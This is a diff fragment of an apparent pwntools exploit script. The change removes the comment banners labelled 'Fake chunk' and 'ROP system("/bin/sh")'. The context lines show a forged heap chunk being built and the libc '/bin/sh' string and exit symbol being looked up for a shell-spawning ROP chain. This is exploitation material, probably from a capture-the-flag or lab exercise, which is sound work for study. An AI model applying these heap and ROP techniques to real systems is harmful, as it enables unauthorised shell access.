@@ -68,9 +68,8 @@ def main():
 
     leave_another(p)
 
-    # ---------------------------
-    # Stage 3 — Fake chunk
-    # ---------------------------
+
+
     FAKE_CHUNK = (
         p32(0) +
         p32(0x41) +
@@ -89,9 +88,8 @@ def main():
 
     leave_another(p)
 
-    # ---------------------------
-    # Stage 4 — ROP system("/bin/sh")
-    # ---------------------------
+
+
     BIN_SH = next(libc.search(b"/bin/sh"))
     EXIT   = libc.symbols["exit"]
 
